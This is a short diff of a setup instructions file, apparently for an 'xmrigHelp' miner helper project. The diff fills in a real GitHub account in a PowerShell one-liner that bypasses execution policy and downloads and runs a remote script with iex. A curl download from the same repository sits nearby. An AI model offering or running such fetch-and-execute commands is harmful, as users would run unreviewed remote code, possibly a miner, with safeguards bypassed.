@@ -31,7 +31,7 @@ curl https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/main/script.py -o 
 ```
 OR
 ```powershell
-powershell -NoProfile -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex(iwr 'https://raw.githubusercontent.com/USER/REPO/main/script.ps1')" "<dir>"
+powershell -NoProfile -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex(iwr 'https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/main/script.ps1')" "<dir>"
 ```
 
 
